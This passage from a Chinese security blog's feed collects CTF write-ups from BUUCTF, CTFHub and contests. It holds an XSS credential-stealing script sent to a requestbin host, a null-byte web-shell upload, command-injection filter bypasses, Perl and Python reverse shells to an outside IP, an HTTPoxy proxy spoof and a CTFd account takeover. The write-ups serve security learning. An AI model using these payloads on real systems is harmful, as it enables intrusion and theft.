documcookieent.getElemcookieentsByName("password")[0].value;</span></span><br><span class="line"><span class="regexp">var res = uname + " " + passwd;</span></span><br><span class="line"><span class="regexp">documcookieent.locacookietion="http:/</span><span class="regexp">/http.requestbin.buuoj.cn/</span>?a=<span class="string">"+res;</span></span><br><span class="line"><span class="string">&lt;/scricookiept&gt;</span></span><br></pre></td></tr></table></figure><p>等一段时间之后，即可在requestbin看到回显：</p><p><img src="http://www.ggb0n.cool/images/gwctf04.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去年安恒决赛，同时还进行着GWCT，当时没做，现在复现复现💩
    
    </summary>
    
    
      <category term="CTF学习记录" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="BUU刷题" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BUU%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/tags/CTF/"/>
    
      <category term="web" scheme="http://ggb0n.cool/tags/web/"/>
    
      <category term="php伪随机" scheme="http://ggb0n.cool/tags/php%E4%BC%AA%E9%9A%8F%E6%9C%BA/"/>
    
      <category term="SSTI" scheme="http://ggb0n.cool/tags/SSTI/"/>
    
      <category term="XSS" scheme="http://ggb0n.cool/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub部分记录</title>
    <link href="http://ggb0n.cool/2020/03/03/CTFHub%E9%83%A8%E5%88%86%E8%AE%B0%E5%BD%95/"/>
    <id>http://ggb0n.cool/2020/03/03/CTFHub%E9%83%A8%E5%88%86%E8%AE%B0%E5%BD%95/</id>
    <published>2020-03-03T09:57:58.000Z</published>
    <updated>2020-04-22T00:13:53.299Z</updated>
    
    <content type="html"><![CDATA[<p>技能树里几道学到新知识的题目的记录，还不错还不错😎<a id="more"></a></p><h2 id="技能树-web-00截断"><a href="#技能树-web-00截断" class="headerlink" title="技能树-web-00截断"></a>技能树-web-00截断</h2><p>这一题考察<code>00</code>截断，但是不是单纯地在文件名后缀处截断，那种方法只能绕过前端，但是本题后端还会有检测，因此需要构造绕过后端检测的截断。<br>看到群里有些师傅问一些爆破文件名之类问题…感觉还是写一下题解吧，希望能有帮助，自己也记录一下。（为了写题解，又花30金币…LinE师傅求报销啊）</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>拿到题目先看看源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    $name = basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    $info = pathinfo($name);</span><br><span class="line">    $ext = $info[<span class="string">'extension'</span>];</span><br><span class="line">    $whitelist = <span class="keyword">array</span>(<span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"gif"</span>);</span><br><span class="line">    <span class="keyword">if</span> (in_array($ext, $whitelist)) &#123;</span><br><span class="line">        $des = $_GET[<span class="string">'road'</span>] . <span class="string">"/"</span> . rand(<span class="number">10</span>, <span class="number">99</span>) . date(<span class="string">"YmdHis"</span>) . <span class="string">"."</span> . $ext;</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $des)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('上传成功')&lt;/script&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('上传失败')&lt;/script&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件类型不匹配"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过审计可知，代码的逻辑如下：</p><ul><li>1、首先取到上传文件的扩展名<code>$ext</code></li><li>2、将扩展名与白名单进行匹配，为<code>jpg</code>、<code>png</code>或<code>gif</code>才能通过第一次过滤</li><li>3、扩展名匹配之后，为上传的文件构造了一个新的存储路径<code>$des</code>，这个地方用了<code>rand()</code>函数，就看到有些师傅问是不是要爆破…看到后面的<code>$ext</code>怎么能想着爆破呢？这是正常上传图片的存储路径，人家后缀都是通过匹配的<code>$ext</code>，自己的小马肯定是<code>php</code>啊…</li></ul><p>这题是考察<code>00截断</code>的，突破点也很明显了：构造<code>$des</code>的时候，首先取的是<code>road</code>参数的内容<code>/var/www/html/upload/</code>，想到看到的绕过后端检测的一篇文章，需要在存储路径的地方构造截断：<code>/var/www/html/upload/shell.php%00</code>。<br>这里注意一下：存储路径后面要加一个<code>php</code>后缀的文件名，然后利用<code>%00</code>进行截断，这样上传文件的内容就存到了<code>shell.php</code>里，还要注意要用<code>%00</code>截断，由于内容在请求头中，直接在<code>hex</code>中改<code>00</code>会报bad request。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>抓包改包如下：<br><img src="http://www.ggb0n.cool/images/ctfhub0.png" alt=""><br><img src="http://www.ggb0n.cool/images/ctfhub1.png" alt=""><br>成功上传，蚁剑连接<code>url/var/www/html/upload/shell.php</code>即可。</p><h2 id="命令注入-综合"><a href="#命令注入-综合" class="headerlink" title="命令注入-综合"></a>命令注入-综合</h2><p>一个考察点比较全面，但是也是比较入门的题目。主要考察了对连接符、特殊文件名、读取文件命令等过滤的绕过。<br>这个题解题的时候走了一大圈弯路，并且还撞到了墙上，后来用正常姿势解了出来…</p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>既然比较综合，先看看源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$res = <span class="keyword">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]) &amp;&amp; $_GET[<span class="string">'ip'</span>]) &#123;</span><br><span class="line">    $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">    $m = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">"/(\||&amp;|;| |\/|cat|flag|ctfhub)/"</span>, $ip, $m)) &#123;</span><br><span class="line">        $cmd = <span class="string">"ping -c 4 &#123;$ip&#125;"</span>;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到对<code>ip</code>传参内容中的<code>连接符</code>、<code>空格</code>、<code>cat</code>命令、<code>flag</code>字段进行了过滤，对空格过滤很简单，<code>${IFS}</code>就行，之前的一篇博客也写过，对<code>cat</code>和<code>flag</code>的过滤也很简单，用<code>\</code>即可绕过：<code>ca\t f\lag</code>，关键就在于对<code>|、&amp;、;</code>三个连接符的过滤，最初没有考虑是<code>GET</code>传参，忘记了用<code>%0a</code>代替<code>;</code>，而是选择用<code>8/16进制</code>进行绕过，从而跳进了大坑…<br>这种方法构造思路就是：利用字符的<code>ascii</code>码对应的<code>8/16进制</code>表示字符，结合<code>printf</code>命令输出字符串，然后利用<code>$</code>将字符串当作命令执行，比如：</p><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ls</span>：$(printf$&#123;IFS&#125;<span class="string">"\154\163"</span>)</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/ctfhub2.png" alt=""><br>但是构造的payload一直没打通，于是本地测了一下：<br><img src="http://www.ggb0n.cool/images/ctfhub3.png" alt=""><br>原来是输出的内容被当作ip的一部分了… 但是没搞懂为啥这样构造出来的字符会被当做前面命令的一部分…</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>由于是<code>GET</code>传参，利用连接符的url编码就能绕过，比如<code>;</code>对应<code>%0a</code>，构造payload如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip&#x3D;127.0.0.1%0acd$&#123;IFS&#125;fl\ag_is_here%0aca\t$&#123;IFS&#125;fl\ag_64331483515023.php</span><br></pre></td></tr></table></figure><p>即可拿到flag：<br><img src="http://www.ggb0n.cool/images/ctfhub4.png" alt=""><br>这里的<code>cat</code>其实还可以用<code>more</code>、<code>less</code>、<code>tail</code>、<code>sort</code>命令替换，具体可以查一下几个命令的区别。<br>对文件名的过滤也可以通过利用变量的形式来绕过，网上有很多例子可以参考，这里不再写了。</p><p>关于更多命令注入的绕过姿势可以参考<a href="https://www.dazhuanlan.com/2019/12/18/5df97aff1f94c/">这里</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;技能树里几道学到新知识的题目的记录，还不错还不错😎
    
    </summary>
    
    
      <category term="CTF学习记录" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="CTFHub刷题" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/CTFHub%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="文件上传" scheme="http://ggb0n.cool/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
      <category term="00截断" scheme="http://ggb0n.cool/tags/00%E6%88%AA%E6%96%AD/"/>
    
      <category term="命令注入" scheme="http://ggb0n.cool/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N公开赛</title>
    <link href="http://ggb0n.cool/2020/02/29/V&amp;N%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
    <id>http://ggb0n.cool/2020/02/29/V&amp;N%E5%85%AC%E5%BC%80%E8%B5%9B/</id>
    <published>2020-02-29T12:33:18.000Z</published>
    <updated>2020-04-22T00:16:05.976Z</updated>
    
    <content type="html"><![CDATA[<p>隔离在家无事做，打打比赛乐趣寻~ 卧槽！毕设还没开始？！🤨<a id="more"></a></p><h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>考察<a href="https://yinwc.github.io/2018/11/15/vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#HTTPoxy%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-5385%EF%BC%89">CVE-2016-5385</a>：可以理解为伪造代理吧。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审计代码，可以看到使用了<code>Guzzle</code>：</p><blockquote><p>Guzzle是一个使得利用PHP实现发送HTTP请求，方便和web service集成的PHP客户端模拟组件。一句话，它就像一个PHP写的浏览器。当你的服务端程序需要作为客户端来访问其他的service服务时，这就是你所需要的。<br>简单的接口构建query string，POST requests,streaming large uploads/downloads,使用HTTP cookies,上传json data等。</p></blockquote><p>根据代码逻辑，我们可以通过<code>flag</code>传参来拿到flag，但是是通过在服务器上创建一个<code>client()</code>，然后利用这个<code>client</code>去访问本地5000端口下的<code>/api/eligible</code>文件夹下的文件，将返回的json数据解码之后，如果字段里的<code>success</code>为<code>true</code>，即可拿到flag。</p><p>关键就在于<code>$client-&gt;get(&#39;http://127.0.0.1:5000/api/eligible&#39;)</code>，题目服务器上肯定是没有这个了，想要实现要么可以通过拿到shell写入，要么就是代理到VPS上。<br>通过<code>phpinfo</code>可以看到，接口用的是<code>fastCGI</code>：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web116.png" alt=""><br>找到的<a href="https://yinwc.github.io/2018/11/15/vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#HTTPoxy%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-5385%EF%BC%89">CVE-2016-5385</a>就是通过CGI来伪造代理，大致原理：</p><blockquote><p><code>cgi(fastcgi)</code>要将用户传入的所有HTTP头都加上<code>HTTP_</code>前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的<code>HTTP_PROXY</code>值作为HTTP代理地址。于是，恶意用户通过提交<code>Proxy: http://evil.com</code>这样的HTTP头，将使用缺陷类库的网站的代理设置为<code>http://evil.com</code>，进而窃取数据包中可能存在的敏感信息。</p></blockquote><p>于是，我们就可以理一下解题思路了：</p><ul><li>1、在VPS上构造<code>/api/eligible/index.php</code>，并且读取到的结果要包含<code>{“success”:true}</code>，可以参考下面的<code>index.php</code>的代码</li><li>2、利用<code>php -S localhost:5000</code>在VPS上打开web服务的端口，注意：在包含<code>/api/eligible/index.php</code>的文件夹下开启web服务</li><li>3、通过<code>flag</code>传参，抓包，在请求头中加入：<code>http://ip:port</code>，此处的<code>ip</code>是VPS的ip(由于BUU要求内网环境，这里就填内网机器的ip)，<code>port</code>为VPS上一个开启的端口，可以利用<code>php -S</code>命令开启两个web服务端口来进行</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = <span class="keyword">array</span>();</span><br><span class="line">$data[<span class="string">'success'</span>] = <span class="keyword">true</span>;</span><br><span class="line"> </span><br><span class="line">$json_string = json_encode($data);</span><br><span class="line"><span class="keyword">echo</span> $json_string;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于BUU上需要用内网，就在BUU中开了一个内网环境作为VPS：<br><img src="http://www.ggb0n.cool/images/114.png" alt=""><br><img src="http://www.ggb0n.cool/images/113.png" alt=""><br>如此以来，VPS就成为代理了，后面的<code>$client-&gt;get(&#39;http://127.0.0.1:5000/api/eligible&#39;)</code>也就在VPS上执行了，从而找到指定文件，返回<code>{“success”:true}</code>，进而通过后面的判断，拿到flag。<br><img src="http://www.ggb0n.cool/images/112.png" alt=""></p><h2 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h2><p>考察利用perl或python反弹shell，通过文件描述符读取被删除的文件内容。</p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目源码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>) </span><br><span class="line"><span class="comment"># flag = flag_file.read() </span></span><br><span class="line"><span class="comment"># flag_file.close() </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># @app.route('/flag') </span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment"># return flag</span></span><br><span class="line"><span class="comment">#want flag? naive! </span></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think </span></span><br><span class="line"><span class="meta">@app.route('/shell') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span> </span><br><span class="line">os.system(<span class="string">"rm -f flag.txt"</span>) </span><br><span class="line">exec_cmd = request.args.get(<span class="string">'c'</span>) </span><br><span class="line">os.system(exec_cmd) </span><br><span class="line"><span class="keyword">return</span> <span class="string">"1"</span> </span><br><span class="line"><span class="meta">@app.route('/') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span> </span><br><span class="line"><span class="keyword">return</span> open(<span class="string">"app.py"</span>,<span class="string">"r"</span>).read() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>: </span><br><span class="line">app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>可以看到，flag文件首先被读取了，读取文件的进程在内存中是存在的，因此当我们通过<code>/shell?c=</code>来传入命令的时候，虽然会先删掉flag文件，但是flag内容仍然在内存里，通过读取<code>/proc/PID/fd/文件描述符</code>来读取。<br>解题的关键就是通过参数<code>c</code>利用<code>system</code>执行命令来反弹shell，然后去进程信息中找flag。</p><p>在这里<code>curl</code>不能用了，但是还可以利用<code>perl</code>、<code>python</code>、<code>ruby</code>等语言来反弹shell，pyload如下：</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">/shell?c=perl%20-MIO%20-e%20%27$p=<span class="keyword">fork</span>;<span class="keyword">exit</span>,<span class="keyword">if</span>($p);$c=new%20IO::Socket::INET(PeerAddr,%22174.<span class="number">0</span>.<span class="number">216.133</span>:<span class="number">2017</span>%22);STDIN-%3Efdopen($c,r);$~-%3Efdopen($c,w);<span class="keyword">system</span>$_%20while%3C%3E;%27</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="code"><pre><span class="line">/shell?c=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.0.216.133%22,2017));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27</span><br></pre></td></tr></table></figure><p>注意是反弹shell到VPS上，但是BUU需要用内网环境，和上题一样，开一个BUU的内网环境，通过<code>nc -l -p 2017</code>监听端口:<br><img src="http://www.ggb0n.cool/images/107.png" alt=""><br>然后利用上面的payload访问即可反弹shell<br>利用<code>perl</code>反弹的shell如下：<br><img src="http://www.ggb0n.cool/images/108.png" alt=""><br><img src="http://www.ggb0n.cool/images/109.png" alt=""><br>利用<code>python</code>反弹的shell：<br><img src="http://www.ggb0n.cool/images/110.png" alt=""><br>其实还是python反弹的好用些。</p><p>通过<code>cat /proc/PID/fd/文件描述符</code>一个个地找就能拿到flag了。</p><h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>考察刚爆出的CTFd存在的一个CVE，<a href="https://www.colabug.com/2020/0204/6940556/amp/">CVE-2020-7245</a></p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>上面的CVE链接中讲的已经很清楚了，整体的解题思路就是：</p><ul><li>1、注册一个<code>admin</code>用户，(注意前面的空格)</li><li>2、更改上面用户的密码，即利用注册的邮箱来更改密码</li><li>3、成功修改管理员的密码并登录</li></ul><p>注意BUU的内网环境需要用内网里的邮箱，否则收不到邮件，巨坑…</p><p>登录之后，在管理通道发现<code>flag在哪里</code>一个题目，把它的隐藏属性改为可见的，再到challenge页面即可看到该题目，下载附件即可拿到flag。</p><h2 id="拉胯的三条命令"><a href="#拉胯的三条命令" class="headerlink" title="拉胯的三条命令"></a>拉胯的三条命令</h2><p>想到了热剧“亲爱的，热爱的”…</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>下载附件之后，将后缀改为<code>.zip</code>解压发现一个数据包和一个提示的txt文件，提示将数据包中的端口从小到大排列即为flag。<br>利用<code>tcpdump</code>直接读数据包中的端口，然后就能拿到flag，命令如下：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tcpdump</span> -n -r nmapll.pcapng <span class="string">'tcp[13]=18'</span> | awk <span class="string">'&#123;print <span class="variable">$3</span>&#125;'</span> | sort -u</span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="http://www.ggb0n.cool/images/111.png" alt=""><br>组合即为flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;隔离在家无事做，打打比赛乐趣寻~ 卧槽！毕设还没开始？！🤨
    
    </summary>
    
    
      <category term="CTF学习记录" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="比赛划水" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"/>
    
    
      <category term="CVE" scheme="http://ggb0n.cool/tags/CVE/"/>
    
      <category term="CVE-2016-5385代理伪造" scheme="http://ggb0n.cool/tags/CVE-2016-5385%E4%BB%A3%E7%90%86%E4%BC%AA%E9%80%A0/"/>
    
      <category term="CVE-2020-7245" scheme="http://ggb0n.cool/tags/CVE-2020-7245/"/>
    
      <category term="反弹shell" scheme="http://ggb0n.cool/tags/%E5%8F%8D%E5%BC%B9shell/"/>
    
      <category term="tcpdump获取数据包端口" scheme="http://ggb0n.cool/tags/tcpdump%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8C%85%E7%AB%AF%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>安恒-抗疫月赛</title>
    <link href="http://ggb0n.cool/2020/02/26/%E5%AE%89%E6%81%92-%E6%8A%97%E7%96%AB%E6%9C%88%E8%B5%9B/"/>
    <id>http://ggb0n.cool/2020/02/26/%E5%AE%89%E6%81%92-%E6%8A%97%E7%96%AB%E6%9C%88%E8%B5%9B/</id>
    <published>2020-02-26T12:38:28.000Z</published>
    <updated>2020-04-22T00:16:15.713Z</updated>
    
    <content type="html"><![CDATA[<p>抗疫抗疫！来自安全人员的行动！<a id="more"></a></p><h2 id="Web-easy-hash"><a href="#Web-easy-hash" class="headerlink" title="Web-easy-hash"></a>Web-easy-hash</h2><p>考察md5强比较、弱比较以及md5碰撞，本题是掘安杯的audit题改的，参考getfly师傅的<a href="http://www.gtfly.top/2019/04/07/%E6%8E%98%E5%AE%89%E6%9D%AFwp.html#audit">博客</a>。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>进入题目，给出了源码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$val1 = @$_GET[<span class="string">'val1'</span>];</span><br><span class="line">$val2 = @$_GET[<span class="string">'val2'</span>];</span><br><span class="line">$val3 = @$_GET[<span class="string">'val3'</span>];</span><br><span class="line">$val4 = @$_GET[<span class="string">'val4'</span>];</span><br><span class="line">$val5 = (string)@$_POST[<span class="string">'val5'</span>];</span><br><span class="line">$val6 = (string)@$_POST[<span class="string">'val6'</span>];</span><br><span class="line">$val7 = (string)@$_POST[<span class="string">'val7'</span>];</span><br><span class="line"><span class="keyword">if</span>( $val1 == $val2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val1 OR val2 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($val1) != md5($val2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $val3 == $val4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val3 OR val4 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($val3) !== md5($val4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $val5 == $val6 || $val5 == $val7 || $val6 == $val7 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val5 OR val6 OR val7 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (md5($val5) !== md5($val6) || md5($val6) !== md5($val7) || md5($val5) !== md5($val7))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'b'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"come on!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[<span class="string">'a'</span>];</span><br><span class="line">$b = $_POST[<span class="string">'b'</span>];</span><br><span class="line">$m = $_GET[<span class="string">'m'</span>];</span><br><span class="line">$n = $_GET[<span class="string">'n'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctype_alnum($a)) || (strlen($a) &gt; <span class="number">5</span>)  || !(ctype_alnum($b)) || (strlen($b) &gt; <span class="number">6</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"a OR b fail!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((strlen($m) &gt; <span class="number">1</span>) || (strlen($n) &gt; <span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"m OR n fail"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$val8 = md5($a);</span><br><span class="line">$val9 = strtr(md5($b), $m, $n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;val8 : $val8&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;val9 : $val9&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">if</span> (($val8 == $val9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === <span class="number">5</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nice,good job,give you flag:"</span>;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'/var/www/html/flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码可以看到，我们需要找到满足<code>md5弱比较</code>条件的<code>val1</code>和<code>val2</code>，这个网上有很多：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>e开头的md5和原值：</span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1502113478a</span><br><span 